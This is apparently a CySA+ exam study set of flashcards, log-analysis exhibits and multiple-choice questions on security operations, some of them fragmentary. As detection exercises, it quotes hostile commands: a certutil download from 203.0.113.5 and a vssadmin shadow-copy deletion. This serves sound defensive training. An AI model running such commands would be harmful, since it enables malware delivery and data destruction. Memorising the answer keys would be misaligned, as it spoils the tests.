Contact the sending bank's fraud team immediately to attempt a recall, then report and preserve evidence.
Mean Time To Detect / Mean Time To Respond - core SOC performance metrics. MTTR can also mean Mean Time To Remediate (a separate, longer metric), so check the context.
MOUs, SLAs, organisational governance, business process interruption, degrading functionality, legacy and proprietary systems.
Non-technical first section: what happened, impact, actions taken, decisions needed.
Australia's Notifiable Data Breaches scheme: notify OAIC and affected individuals of eligible breaches likely to cause serious harm; assess suspected breaches within 30 days.
Cyber Security Act 2024: businesses with turnover above $3M must report ransomware/extortion payments to ASD within 72 hours.
SLA = contractual service levels (can restrict maintenance windows). MOU = less formal agreement of intent between parties.
TCP connect scan - completes the full three-way handshake using the OS. Default when the user lacks raw packet privileges; noisier and more likely to be logged than -sS.
UDP scan. No response = open|filtered; ICMP port unreachable (type 3, code 3) = closed. Slow, so often limited to key ports (53, 161, 123).
-p- scans all 65535 ports. -p 22,80,443 or -p 1-1024 sets specific ports. -F scans the top 100. With no option, Nmap scans the 1000 most common ports.
Skips host discovery and treats every target as online. Use when hosts block ping/ICMP and would otherwise be reported as down.
Host discovery (ping sweep) only - finds live hosts without port scanning. Formerly -sP.
Aggressive option: OS detection (-O), version detection (-sV), default script scan (-sC) and traceroute in one flag. Very noisy.
Timing templates: T0 paranoid, T1 sneaky, T2 polite, T3 normal (default), T4 aggressive (common on fast reliable networks), T5 insane. Lower = slower and stealthier.
Runs Nmap Scripting Engine (NSE) scripts. -sC = the default script set; --script vuln (or a named script) runs a chosen category or script.
Output formats: -oN normal, -oX XML (for import into other tools), -oG grepable. -oA <name> writes all three at once.
open = service accepting connections. closed = reachable but nothing listening (RST). filtered = a firewall blocks probes, so Nmap cannot tell. Also unfiltered, open|filtered, closed|filtered.
22/TCP = SSH (also SFTP and SCP), encrypted remote shell. 23/TCP = Telnet, cleartext - credentials can be sniffed; replace with SSH.
25/TCP = SMTP server-to-server mail relay. 587 = mail submission from clients (STARTTLS). 465 = SMTP over implicit TLS. Outbound 25 from a workstation can indicate spam malware.
DNS. UDP for most queries; TCP for zone transfers (AXFR) and large responses. Unexpected TCP 53 or a zone transfer to an outside host is suspicious.
Kerberos (TCP/UDP) - authentication on Active Directory domain controllers.
Microsoft RPC endpoint mapper (TCP). Used by DCOM and WMI; common in Windows lateral movement. Should not be exposed to the internet.
139/TCP = NetBIOS Session Service (SMB over NetBIOS). 445/TCP = SMB directly over TCP. File sharing, PsExec-style lateral movement, and worms such as WannaCry. Never expose to the internet.
389 = LDAP (directory queries, cleartext unless upgraded with StartTLS). 636 = LDAPS (LDAP over TLS). Global catalog uses 3268/3269.
443/TCP = HTTPS (HTTP over TLS). 80/TCP = HTTP, cleartext. Much C2 traffic hides in 443 because it blends in and is rarely blocked.
RDP (Remote Desktop Protocol). Internet-exposed RDP is a leading ransomware entry point; put it behind a VPN or gateway with MFA.
1433/TCP = Microsoft SQL Server (1434/UDP = SQL Browser). 3306/TCP = MySQL/MariaDB. Databases should not be reachable from the internet.
WinRM: 5985 = HTTP, 5986 = HTTPS. Used by PowerShell Remoting; watch for unexpected use as a lateral movement channel.
Security log: an account successfully logged on. Check the Logon Type, source IP/workstation and account name.

2 interactive (console), 3 network (SMB share), 4 batch (scheduled task), 5 service, 7 unlock, 8 network cleartext, 9 new credentials (runas /netonly), 10 remote interactive (RDP), 11 cached interactive.
An account failed to log on. Many from one source = brute force; one password across many accounts = password spraying. Sub-status 0xC000006A = bad password, 0xC0000064 = user does not exist.
4634 = an account was logged off (session ended). 4647 = user-initiated logoff. Pair with 4624 (matching Logon ID) to work out session length.
A logon was attempted using explicit credentials (e.g. runas, or a tool given another account's credentials). Logged on the source machine; useful for spotting lateral movement.
Special privileges assigned to new logon - an admin-equivalent account (e.g. SeDebugPrivilege) logged on. Unexpected accounts here deserve a look.
A new process has been created. Shows the process and its parent; command-line capture must be enabled by policy ('Include command line in process creation events').
A service was installed. 4697 is in the Security log (needs auditing enabled); 7045 is in the System log from the Service Control Manager. Common sign of PsExec and persistence.
A user account was created. An account created outside the normal provisioning process can be attacker persistence.
A member was added to a security-enabled local group (e.g. local Administrators). Domain global group adds = 4728; universal group adds = 4756.
A user account was locked out. For domain accounts it is logged on the domain controller; the Caller Computer Name shows where the bad attempts came from.
The Security audit log was cleared. A classic anti-forensics indicator - always investigate. (System log cleared = event 104.)
How long an attacker was present before being detected, usually measured from initial compromise to detection. Lower MTTD means lower dwell time.
A metric is any measurement (e.g. 340 alerts this week). A KPI is a metric tied to a target that shows performance (e.g. 95% of criticals fixed within 14 days).
Average time from detecting an incident to stopping its spread (host isolated, account disabled). Sits between MTTD and mean time to remediate.
Average time from detection (or a vulnerability being found) to the issue being fully fixed and verified. Longer than mean time to respond.
Using a separate channel (phone, pre-arranged secure chat) during an incident because normal email or chat may be compromised or watched by the attacker.
Executive summary, incident details, timeline, scope and impact, evidence, root cause, recommendations (owner, due date), lessons learned.
Leadership section = impact, risk, status and decisions needed, in plain language. The detailed section = IoCs, hosts, timeline and exact actions for IT teams, often in an appendix.
Table in the IR plan mapping incident criteria (data involved, systems affected, spread, business impact) to a severity level, who must be told and how fast.
Blameless review held soon after an incident closes: what happened, what worked, what didn't and what to change. Actions get an owner and due date.
Percentage of findings remediated within the agreed timeframe for their severity (e.g. criticals within 14 days). Late closures count as misses.
How long findings have stayed open, usually reported in buckets (0-30, 31-60, 61-90, 90+ days) to show overdue risk building up.
Findings that come back after being closed (e.g. a patch rolled back or a rebuilt image missing it). Points to a configuration management failure.
Documented decision not to remediate yet: business justification, compensating controls, risk owner sign-off and an expiry or review date. Report open exceptions separately.
Mandatory report to a regulator within a set timeframe (e.g. NDB to the OAIC, GDPR within 72 hours). Legal and executives decide; analysts supply accurate facts.
Compact record of the metric values, e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8: remote, easy, no privileges, no user interaction).
Changed scope (S:C) means exploiting the flaw affects resources beyond the vulnerable component's security authority, e.g. a VM or sandbox escape. Raises the score.
Base = intrinsic severity. Temporal = exploit maturity, remediation level, report confidence. Environmental = adjusted for your assets and controls.
PR: None, Low or High. UI: None or Required. PR:N and UI:N are worst - an unauthenticated attacker needs no victim action.
CVSS rates severity (how bad if exploited). EPSS estimates likelihood (probability of exploitation). Use both, plus KEV, to prioritise.
Exploitability (KEV, public exploit, EPSS), severity (CVSS), asset criticality, exposure (internet-facing) and existing compensating controls.
Continuous discovery and monitoring of internet-facing assets (domains, IPs, cloud services, forgotten or shadow IT) from an attacker's point of view.
Scanner flags a vulnerable version from the banner, but the vendor backported the fix without changing the version string. Confirm with a credentialed check.
Sees only what is exposed over the network (open ports, banners, responses). The attacker's view, but misses local issues and produces more false positives.
CVE = ID for one specific vulnerability in a product. CWE = category of weakness behind it (e.g. CWE-79 is cross-site scripting).
Cutting a compromised host off from the network (EDR isolation, unplugging, quarantine VLAN) while keeping it powered on for evidence collection.
Moving affected systems into a restricted network zone so they cannot reach critical assets, while monitoring continues.
Remove malware and persistence, reimage from a known-good build, reset compromised credentials and close the entry point (patch, config fix).
Restore from known-good backups, confirm systems are clean and patched, then monitor closely for reinfection before returning to normal operations.
Playbook: high-level response workflow for an incident type (roles, decisions, phases). Runbook: detailed step-by-step procedure for a specific technical task.
Searching all endpoints, logs and mailboxes for indicators found in one incident (hashes, IPs, domains) to find every other affected system.
Resolving a known malicious domain to a controlled address, cutting off C2 and revealing infected hosts by who tries to connect.
Ordering events from many sources (firewall, EDR, mailbox, auth logs) after normalising timestamps to one time zone, usually UTC.
The full extent of what is affected: systems, accounts, data and locations. Establish it before eradication, or the attacker keeps a foothold you missed.
Capturing RAM from a live system before shutdown: running processes, network connections, injected code and encryption keys. Pulling the power loses it.
Live: analysing a running system to capture volatile data. Dead-box: the system is powered off and its disk imaged through a write blocker.
Hardware or software that lets an investigator read evidence media while blocking any writes, preserving its integrity during imaging.
Hash the image (e.g. SHA-256) at acquisition and again before analysis or court. Matching hashes prove the evidence has not changed.
Forensic image: bit-for-bit copy including deleted files, slack and unallocated space. Logical copy: only the visible files and folders.
Endpoint Detection and Response: an agent on each endpoint records process, file and network activity so threats can be detected, investigated and contained (e.g. isolating the host).
Extended Detection and Response: correlates detections across endpoint, email, identity, network and cloud in one platform instead of separate consoles.
Managed Detection and Response: an outsourced service whose analysts monitor, investigate and respond to threats around the clock.
Network Access Control: checks a device's identity and security posture before letting it onto the network, and can quarantine non-compliant devices.
Intrusion Detection System: watches traffic and alerts. Intrusion Prevention System: sits inline and can also block or drop the traffic.
Data Loss Prevention: finds sensitive data and blocks or alerts when it leaves via email, web uploads, USB or cloud sharing.
Tactics, Techniques and Procedures: how an adversary operates. Harder for attackers to change than hashes or IPs, so they sit at the top of the Pyramid of Pain.
Advanced Persistent Threat: a well-resourced, often state-sponsored group that gains covert access and keeps it for a long time.
Open-Source Intelligence: intelligence gathered from public sources such as websites, social media, DNS records and breach dumps.
Information Sharing and Analysis Center: a sector-based body where member organisations share threat intelligence and best practice.
Traffic Light Protocol: labels (CLEAR, GREEN, AMBER, AMBER+STRICT, RED in version 2.0) that tell recipients how widely they may share intelligence.
Domain Generation Algorithm: malware computes many pseudo-random domain names to find its C2 server, which defeats simple domain blocklists.
Command and Control: the infrastructure an attacker uses to send instructions to compromised hosts and receive stolen data back.
Privileged Access Management: vaults, brokers and records the use of admin accounts, often granting just-in-time access.
Multi-Factor Authentication: requires two or more different factor types - something you know, something you have, something you are.
Single Sign-On: one authentication with an identity provider gives access to many applications.
Security Assertion Markup Language: an XML-based standard an identity provider uses to send signed authentication assertions to a service provider.
Common Vulnerability Scoring System: rates vulnerability severity from 0.0 to 10.0 using base, temporal and environmental metric groups (v3.1).
Security Content Automation Protocol: a NIST suite of standards (including CVE, CPE, CVSS, XCCDF and OVAL) so scanners can share checks and results.
Common Platform Enumeration: a standard naming scheme for products, versions and platforms, used to match vulnerabilities to assets.
Web Application Firewall: inspects HTTP/S traffic to an application and blocks attacks such as SQL injection and cross-site scripting.
Open Worldwide Application Security Project: a non-profit community best known for its Top 10 list of web application security risks.
Center for Internet Security: publishes the Critical Security Controls and secure-configuration Benchmarks for operating systems and applications.
Payment Card Industry Data Security Standard: required of any organisation that stores, processes or transmits cardholder data.
Software Development Life Cycle: requirements, design, build, test, deploy and maintain. Security should be built into every phase.
End of Life: the vendor no longer ships patches. A common inhibitor to remediation that calls for replacement or compensating controls.
Business Impact Analysis: identifies critical business processes and the impact of losing them, which sets recovery targets such as RTO and RPO.
Business Continuity Plan: keeps critical business functions running during a disruption. Disaster Recovery Plan: restores IT systems and data afterwards.
Computer Security Incident Response Team: the group responsible for handling security incidents from detection to lessons learned.
Digital Forensics and Incident Response: the combined discipline of investigating incidents forensically and responding to them.
Responsible, Accountable, Consulted, Informed: a matrix that assigns who does, owns, advises on and is told about each task in a plan.
Plan of Action and Milestones: tracks each open weakness with its owner, planned fix, resources and due date until it is closed.

pbqs.q: An internet-facing server shows a burst of failed logons. Which event shows the attacker's successful logon?
pbqs.exhibit:
Security log - FS01 (times UTC)
2026-03-02 14:02:07  4625  Account: administrator  Type: 3   Src: 203.0.113.45  Status: 0xC000006A
2026-03-02 14:02:09  4625  Account: admin          Type: 3   Src: 203.0.113.45  Status: 0xC0000064
2026-03-02 14:02:11  4625  Account: reception      Type: 3   Src: 203.0.113.45  Status: 0xC000006A
2026-03-02 14:02:40  4624  Account: SYSTEM         Type: 5   Src: -
2026-03-02 14:03:02  4624  Account: reception      Type: 10  Src: 203.0.113.45
2026-03-02 14:05:19  4624  Account: jlee           Type: 3   Src: 10.1.20.33
pbqs.explain: 4624 is a successful logon and type 10 is RemoteInteractive (RDP), from the same external IP that just failed against several accounts. 4625 is a failure (0xC000006A = wrong password for a real account, 0xC0000064 = no such user). Type 5 is a service starting, and jlee's type 3 logon from an internal address looks like normal file share access. With Network Level Authentication, failed RDP attempts are often logged as type 3, as here.

pbqs.q: The secure email gateway quarantined this message. Which authentication check failed, and why?
pbqs.exhibit:
Return-Path: <billing@examp1e.com>
Received: from mail.examp1e.com (mail.examp1e.com [198.51.100.23])
        by mx.example.net; Tue, 3 Mar 2026 09:14:22 +1000
Authentication-Results: mx.example.net;
       spf=pass (sender IP is 198.51.100.23) smtp.mailfrom=examp1e.com;
       dkim=none (message not signed);
       dmarc=fail (p=reject) header.from=example.com
From: "Example Property Accounts" <accounts@example.com>
Reply-To: <accounts.example@example.org>
To: <tenant@example.net>
Subject: Updated bank details for rent payments
options: DMARC: SPF passed only for examp1e.com, which does not align with the From domain example.com, and there is no DKIM signature
SPF: 198.51.100.23 is not authorised to send mail for examp1e.com
DKIM: the signature did not match the message body
SPF: the Reply-To domain example.org has no SPF record
pbqs.explain: SPF passed, but for the look-alike envelope domain examp1e.com. DMARC needs SPF or DKIM to pass for a domain aligned with the visible From domain (example.com); neither did, so DMARC failed. SPF never checks Reply-To. The look-alike Return-Path, a Reply-To on a third domain and the 'updated bank details' lure all point to payment redirection fraud.

pbqs.q: Which vulnerability could an unauthenticated attacker exploit over the internet without any action by a user?
pbqs.explain: VULN-A is AV:N (network), PR:N (no privileges) and UI:N (no user interaction) - the 9.8 Critical pattern. VULN-B needs local access and a low-privileged account (a typical privilege escalation). VULN-C is remote but needs a user to act (UI:R), like clicking a link. VULN-D needs physical access.

V-101  web01     Internet-facing  9.1   No        0.61  Yes
V-102  vpn-gw01  Internet-facing  8.6   Yes       0.94  Yes
V-103  hr-db01   Internal only    9.8   No        0.02  No

pbqs.q: An external scan shows RDP (3389/tcp) open on 198.51.100.20 even though rule 3 denies it. Which rule is responsible?
pbqs.exhibit:
Perimeter firewall - inbound rules (processed top-down, first match wins)
#  Action  Source           Destination       Port/Proto
1  Allow   any              198.51.100.10     443/tcp
2  Allow   any              198.51.100.0/24   any
3  Deny    any              198.51.100.20     3389/tcp
4  Allow   203.0.113.0/24   198.51.100.30     22/tcp
5  Deny    any              any               any
pbqs.explain: Rule 2 allows any source to any port on the whole 198.51.100.0/24 range. Because the first match wins, it matches RDP to .20 before rule 3 is reached, so rule 3 is shadowed and never fires (rule 4 is redundant for the same reason). Fix it by removing or narrowing rule 2, or moving specific denies above it.

pbqs.q: You are collecting evidence from a compromised server that is still running. Put these sources in the order they should be collected, most volatile first.
items: RAM: running processes, network connections, routing and ARP tables
pbqs.explain: Collect the most volatile data first because it disappears soonest (RFC 3227): registers and cache, then memory and the live system state it holds, temporary file systems, disk, remote logging, and finally archival media, which barely changes.

pbqs.q: Put the NIST SP 800-61 incident response lifecycle phases in order.
pbqs.explain: These are the four phases in NIST SP 800-61 Rev. 2, which CS0-003 follows. Post-incident lessons learned feed back into preparation, so the lifecycle is a cycle. (NIST's 2025 Rev. 3 reframes incident response around the CSF 2.0 functions, but the exam uses these four phases.)

2026-05-12 01:14:09  UserLoggedIn       IP 10.1.8.22      Client: Outlook desktop
2026-05-12 03:40:51  UserLoggedIn       IP 198.51.100.77  Client: Browser  Location: overseas
2026-05-12 03:42:18  New-InboxRule      Name: "."
                     If subject/body contains "invoice" or "payment":
                     move to RSS Feeds, mark as read
2026-05-12 03:44:02  Send               To: payables@example.net  Subject: RE: Invoice 3381 - updated bank details
2026-05-12 05:02:37  MailItemsAccessed  IP 10.1.8.22      Client: Outlook desktop

pbqs.q: An EDR alert fires on a workstation. What should the analyst do first?
pbqs.exhibit:
EDR alert - WS-0219 (times UTC)
Severity: Critical   Detection: Ransomware behaviour
06:12:40  vssadmin.exe delete shadows /all /quiet
06:12:58  Mass file rename: 1,412 files -> *.locked on mapped drive S: (\\fs02\shared)
06:13:05  Host status: online, powered on, user logged in
Analyst action required
options: Network-isolate the workstation from the EDR console, leaving it powered on
Shut the workstation down immediately to stop the encryption
Reimage the workstation from the golden image
Start a full antivirus scan and wait for the result
pbqs.explain: The host is actively encrypting a shared drive, so cut it off from the network now. Isolating through the EDR stops the spread while keeping RAM (which may hold keys and the running process) for collection. Shutting down loses that volatile evidence, reimaging destroys it entirely, and a scan wastes time while encryption continues.

pbqs.q: An attacker had access to a property manager's mailbox for two days. Audit logs show they opened emails containing tenants' driver's licence scans. Using the matrix, what is the correct classification?
pbqs.exhibit:
Severity matrix (excerpt from the IR plan)
Sev 1 Critical: confirmed data breach involving personal information,
                OR ransomware on more than one system.
                Notify: CISO, Legal and executive team within 1 hour.
Sev 2 High:     confirmed compromise of one account or host, no evidence of data access.
                Notify: SOC manager and IT manager within 4 hours.
Sev 3 Medium:   malware blocked or automatically contained, no compromise.
                Notify: SOC queue, review next business day.
Sev 4 Low:      policy violation or suspicious activity with no impact.
                Notify: ticket only.
options: Sev 1: notify the CISO, Legal and the executive team within 1 hour
Sev 2: only one account was compromised, so notify the SOC manager and IT manager within 4 hours
Sev 2 for now, escalating to Sev 1 only once forensics proves data was copied out
Sev 3: the account has already been contained
pbqs.explain: Unauthorised access to personal information is a data breach even if nothing was proven to be copied out, which meets the Sev 1 criteria. Escalating within the hour lets Legal start the Notifiable Data Breaches assessment. Waiting for perfect forensic certainty delays decisions the matrix says leaders must make now.

pbqs.q: Which sentence is most appropriate for the executive summary of this incident's report?
pbqs.exhibit:
Incident IR-2026-014 - confirmed facts (times AEST)
14 May 08:12  Staff member entered their password on a phishing page
14 May 08:20  Attacker signed in from 198.51.100.77 via legacy IMAP (no MFA prompt)
14 May 08:20-11:05  312 emails accessed, 18 containing tenant personal information

options: An attacker accessed one staff email account for about three hours on 14 May and viewed some tenant personal information. The account is now secured, and Legal is assessing whether affected tenants and the regulator must be notified.
At 08:20 AEST the threat actor authenticated from 198.51.100.77 over IMAP, where legacy protocols bypass MFA enforcement.
The incident was caused by a careless staff member who fell for an obvious phishing email.
No customer data was affected and no further action is required.
pbqs.explain: An executive summary gives impact, status and the decision or next step in plain language. The IMAP detail is accurate but belongs in the technical timeline. Blaming the user misstates the root cause (legacy authentication without MFA), and the last option contradicts the confirmed facts.

bank.q: Logs from several systems show events a few minutes apart that actually happened at the same moment. What should be fixed first so correlation works?
options: Time synchronisation (NTP) across all log sources
bank.explain: Correlation depends on accurate timestamps. Without a common, synchronised time source, events can't be put in the right order.

bank.q: Which architecture runs code only when triggered, with the provider managing the servers, so there is no host OS for the customer to patch?
bank.explain: Serverless (function as a service) abstracts the servers away. The customer secures code, permissions and triggers, not an OS.

bank.q: What best describes zero trust?
options: Use a single strong password for each user
Trust everything inside the corporate network perimeter
Block all external traffic at the firewall
Never trust by default; verify every request based on identity, device and context
bank.explain: Zero trust removes implicit trust based on network location. Every access request is authenticated, authorised and continuously evaluated.

bank.q: A company wants cloud-delivered security (secure web gateway, CASB, ZTNA, firewall) combined with SD-WAN for remote users. What is this model called?
bank.explain: Secure Access Service Edge (SASE) converges networking (SD-WAN) and security services delivered from the cloud.

bank.q: Users sign in once with their identity provider and then reach several cloud apps without signing in again. Which concept is this?
bank.explain: Federation (e.g. SAML or OIDC) lets service providers trust the identity provider's authentication, giving single sign-on.

bank.q: Why does an organisation deploy TLS inspection at its web proxy?
options: To stop users visiting HTTP sites
To see inside encrypted traffic for malware and data loss
bank.explain: Most malicious traffic is encrypted. Inspection decrypts, scans and re-encrypts, which needs the proxy's CA trusted on endpoints and care with privacy-sensitive categories.

bank.q: Which control is designed to stop credit card numbers being emailed outside the organisation?
bank.explain: Data loss prevention inspects content leaving via email, web or devices and can block or alert on patterns such as card numbers.

bank.q: Splitting a flat network so the finance servers sit in their own zone with tightly filtered access is an example of what?
bank.explain: Segmentation limits lateral movement and blast radius by restricting which systems can talk to each other.

bank.q: Which approach removes standing admin rights and grants elevated access only when needed, for a limited time, with the session recorded?
bank.explain: PAM with just-in-time access reduces the window an attacker could abuse privileged credentials, and gives an audit trail.

bank.q: An analyst finds container images built from an unpatched base image. What is the main risk?
options: Every container started from that image inherits the vulnerabilities
bank.explain: Containers are built from images, so vulnerabilities in the base image are copied into every running container until the image is rebuilt.

bank.q: A workstation contacts the same external IP every 300 seconds, plus or minus a few seconds, all night. What does this most likely indicate?
options: A scheduled backup to a NAS
bank.explain: Regular, periodic outbound connections (often with jitter) to the same destination are a classic C2 beacon pattern, especially outside working hours.

bank.q: A web server suddenly sends large volumes of data outbound over DNS to a newly registered domain. What is the most likely activity?
options: A zone transfer to a secondary server
bank.explain: Large or high-volume DNS queries with long, random-looking subdomains to a new domain suggest data being smuggled out via DNS.

bank.q: A user's laptop fan is constantly running and CPU sits near 100% even when idle; an unknown process connects to a mining pool. What is this?
bank.explain: Unauthorised cryptocurrency mining shows as sustained high CPU/GPU use and connections to mining pools.

bank.q: On a Windows host, a new scheduled task runs powershell.exe with an encoded command every hour as SYSTEM. What is the most likely purpose?
bank.explain: Unauthorised scheduled tasks running encoded PowerShell are a common persistence technique (ATT&CK T1053).

bank.q: Which host indicator most strongly suggests ransomware is running?
options: Many files rapidly renamed with a new extension and high disk I/O
Low memory warnings in a game
bank.explain: Mass file modification and renaming, often with a ransom note dropped in folders, is characteristic of encryption in progress.

bank.q: A firewall shows one internal host connecting to TCP 445 on hundreds of internal addresses within a minute. What is happening?
options: Internal scanning or worm-like lateral movement over SMB
bank.explain: A single host sweeping many internal hosts on SMB suggests reconnaissance or self-propagating malware.

bank.q: A new local administrator account named 'support1' appears on a server outside any change window. What should the analyst do first?
options: Ignore it because the name looks legitimate
Disable the firewall to check connectivity
Treat it as a possible compromise and investigate who created it and how
bank.explain: Unexpected new accounts, especially privileged ones, are an indicator of persistence. Check the creating account (e.g. event 4720/4732) and the process involved.

bank.q: An application starts making outbound connections to the internet that it has never made before, right after a plugin update. What indicator category is this?
bank.explain: Unexpected outbound communication from an application can mean a compromised update or supply-chain attack.

bank.q: Which finding best indicates a rogue device on the network?
options: A printer with a static IP
An unknown MAC address offering DHCP leases
A laptop on the guest Wi-Fi
bank.explain: A rogue DHCP server can redirect clients' gateway and DNS settings. Unknown devices providing network services are a red flag.

bank.q: A user receives an email with a link displayed as a bank's URL, but hovering shows hxxp://bank-secure.example.net.ru/login. What is this?
options: An obfuscated link used for phishing
bank.explain: Displayed text that differs from the real destination, especially a look-alike domain, is a phishing indicator.

bank.q: Registry Run keys on several hosts now launch a binary from C:\Users\Public\. Why is this suspicious?
options: Run keys are used only by antivirus
Run keys give persistence, and legitimate software rarely runs from that folder
bank.explain: Run/RunOnce keys start programs at logon. Binaries in user-writable public folders are a common malware location.

bank.q: Outbound traffic from a database server spikes at 2am to a cloud storage provider the company doesn't use. What is the most likely concern?
bank.explain: An unusual volume of outbound data from a sensitive system to an unsanctioned destination at an odd hour suggests exfiltration.

bank.q: A service on a server starts listening on TCP 4444, which isn't in the documented baseline. What should the analyst suspect?
options: A backdoor or reverse shell listener
bank.explain: Activity on unexpected ports compared with the baseline is an indicator. 4444 is the default port for many Metasploit payloads.

bank.q: Which is an example of abnormal OS process behaviour?
options: winword.exe spawning powershell.exe which then downloads a file
bank.explain: Office applications launching scripting engines is a common malicious document pattern. Process parent-child relationships are key evidence.

bank.q: An analyst needs to see whether a specific HTTP request contained an exploit string. Which tool and data source is most suitable?
options: Wireshark with a full packet capture
bank.explain: Only full packet capture contains payloads. Wireshark (or tcpdump to capture) lets you inspect the request content.

bank.q: Which command captures traffic on interface eth0 to a file for later analysis?
bank.explain: tcpdump -i selects the interface and -w writes raw packets to a pcap file that Wireshark can open.

bank.q: An analyst wants to see human-readable text such as URLs and IPs embedded in a suspicious binary without running it. Which tool fits?
bank.explain: The strings utility extracts printable character sequences, often revealing URLs, IPs, file paths and commands. It's quick static analysis.

bank.q: What is the main benefit of detonating a suspicious file in a sandbox such as Cuckoo or Joe Sandbox?
options: Observing its behaviour (processes, network, file changes) safely in isolation
bank.explain: Sandboxes run samples in an isolated, instrumented environment to record behaviour without risking production systems.

bank.q: An email's header shows SPF=fail and DMARC=fail, and the Return-Path domain differs from the From domain. What does this suggest?
options: The sender is likely spoofing the From domain
bank.explain: SPF checks the sending server against the envelope domain, and DMARC requires alignment with the visible From domain. Failures point to spoofing.

bank.q: What does a valid DKIM signature prove?
options: The message was signed by the domain's key and the signed parts weren't altered in transit
The sending IP is on the SPF record
The message was encrypted end to end
bank.explain: DKIM provides integrity and domain authentication of signed headers and body. A validly signed message can still be malicious.

bank.q: Which source helps an analyst check whether an external IP address has been reported for abuse?
bank.explain: IP reputation services such as AbuseIPDB aggregate community reports about malicious IPs. WHOIS shows registration details.

bank.q: A WHOIS lookup on a domain in a phishing email shows it was registered yesterday. Why does that matter?
options: It proves the domain is legitimate
Newly registered domains are commonly used for phishing and are higher risk
bank.explain: Domain age is a strong risk signal. Attackers register look-alike domains shortly before campaigns.

bank.q: Which PowerShell command decodes a Base64 string, something often needed to read obfuscated scripts?
bank.explain: PowerShell -EncodedCommand uses Base64 of UTF-16LE (Unicode) text. Decoding it reveals the real command.

bank.q: Which regular expression best matches an IPv4-like pattern in logs?
bank.explain: Four groups of 1-3 digits separated by dots. It will also match invalid values like 999, so validate afterwards.

bank.q: A user's account signs in from Brisbane and then from another continent 20 minutes later. Which analysis technique flags this?
options: Impossible travel detection in user behaviour analytics
bank.explain: Impossible travel compares sign-in locations against plausible travel time. It's often a sign of stolen credentials or tokens, but VPNs can cause false positives.

bank.q: Why do analysts compare a file's SHA-256 hash against threat intelligence?
options: To identify known malware without executing the file
bank.explain: A hash uniquely identifies file content, so matching it against known-bad lists is fast and safe. A single changed byte gives a new hash.

bank.q: In a SIEM, what is the purpose of correlation rules?
options: Linking related events from different sources to detect a pattern no single event shows
bank.explain: For example, many failed logins followed by a success and a new admin account. Correlation turns raw events into meaningful alerts.

bank.q: An EDR alert shows rundll32.exe loading a DLL from a temp folder and connecting to the internet. What should the analyst do next?
options: Close the alert because rundll32 is a Windows binary
Investigate the process tree and DLL, and isolate the host if it's malicious
Delete the temp folder on all hosts
bank.explain: Attackers abuse legitimate binaries (LOLBins) like rundll32. Context such as path, parent process and network activity decides whether it's malicious.

bank.q: Which data format is most commonly used for API responses that a SOAR playbook parses?
bank.explain: JSON is the dominant format for REST APIs, made of key-value pairs and arrays that scripts and playbooks parse easily.

bank.q: An analyst sees 'cmd.exe /c certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe'. What is this command doing?
options: Using certutil to download a file from a remote server
bank.explain: certutil is a legitimate Windows tool often abused as a downloader. That's a living-off-the-land technique.

bank.q: Which threat actor type is typically well funded, patient and focused on long-term espionage?
bank.explain: Advanced persistent threats are usually state-sponsored, with resources for custom tools, zero-days and long dwell times.

bank.q: A group defaces a council website to protest a planning decision. Which actor type is this?
bank.explain: Hacktivists are ideologically motivated and favour visible actions like defacement, DDoS and leaks.

bank.q: An employee emails a spreadsheet of customer data to the wrong external address by mistake. What kind of threat is this?
bank.explain: Insider threats include careless mistakes as well as malicious acts. Controls include DLP, training and least privilege.

bank.q: Threat intelligence that is accurate but six months old about a campaign that has ended fails which quality criterion?
bank.explain: Good intelligence is timely, relevant and accurate. Old intel may no longer be actionable.

bank.q: Which is an example of closed-source threat intelligence?
options: A government advisory published on a public website
bank.explain: Closed-source intel comes from paid feeds, private sharing groups and internal data. Open source (OSINT) is publicly available.

bank.q: What is the main purpose of an ISAC?
options: Sharing threat intelligence among organisations in the same sector
bank.explain: Information Sharing and Analysis Centers let members in a sector, such as finance or health, share indicators and incidents.

bank.q: A threat hunt starts with: 'Attackers may be using scheduled tasks for persistence on our file servers.' What is this?
bank.explain: Hypothesis-driven hunting starts from a testable assumption based on intel or ATT&CK, then searches the data to prove or disprove it.

bank.q: Why might a threat hunt focus on business-critical assets and misconfigurations?
options: Because they generate the most logs
They are high-value targets and common footholds, so hunting there gives the best return
bank.explain: Hunting is prioritised where impact would be greatest and where weaknesses such as misconfigurations are likely to be exploited.

bank.q: What is a honeypot used for?
options: Attracting and observing attackers with a decoy system that has no legitimate use
bank.explain: Any interaction with a honeypot is suspicious by definition, which gives high-fidelity alerts and intel on attacker techniques.

bank.q: Which is the best example of turning threat intelligence into detection?
options: Writing a SIEM rule for the TTPs described in a new advisory
Printing the advisory for the noticeboard
bank.explain: Intel becomes useful when it feeds detection and monitoring, vulnerability management and risk decisions.

bank.q: Which task is the best candidate for automation in a SOC?
options: Deciding whether to notify a regulator
Enriching every phishing alert with sender reputation, URL scans and attachment hashes
bank.explain: Good automation candidates are repeatable, rules-based and need no human judgement. Enrichment saves analysts time on every alert.

bank.q: What does a SOAR platform add on top of a SIEM?
options: Orchestration and automated response playbooks across tools
bank.explain: SOAR coordinates actions across tools (ticketing, EDR, email, firewalls) using playbooks, reducing manual steps.

bank.q: A tool sends an HTTP POST to a ticketing system the moment an alert fires, without being polled. What is this mechanism?
bank.explain: Webhooks push event data to a URL in real time. APIs are often polled, while webhooks are event-driven.

bank.q: What does 'single pane of glass' mean in security operations?
options: One console showing data and actions from many tools
bank.explain: Consolidating views and actions reduces swivel-chair work between consoles and speeds up investigations.

bank.q: Why should a SOC standardise processes before automating them?
options: Automating an inconsistent process just produces inconsistent results faster
bank.explain: Document and standardise first, then automate the stable, repeatable steps.

bank.q: Combining several threat feeds, removing duplicates and scoring indicators before they reach the SIEM is an example of what?
options: Threat feed aggregation and data enrichment
bank.explain: Aggregating and normalising feeds reduces noise and false positives, and gives analysts richer context.

bank.q: Which is the main risk of fully automated blocking with no human review?
options: A false positive could block legitimate business activity
bank.explain: High-impact actions such as disabling executives or blocking core services often keep a human approval step.

bank.q: An integration lets the EDR quarantine a host when the SIEM raises a high-confidence alert. What enables the tools to talk to each other?
bank.explain: Application programming interfaces let tools exchange data and trigger actions programmatically.

bank.q: Which scan type logs in to hosts with an account so it can check installed patches and local configuration?
bank.explain: Credentialed scans see what's installed and configured, giving fewer false positives and more findings than an outside-only view.

bank.q: Why would an organisation run a scan from outside its perimeter as well as internally?
options: External scans find every internal vulnerability
To see what an internet attacker can reach and exploit
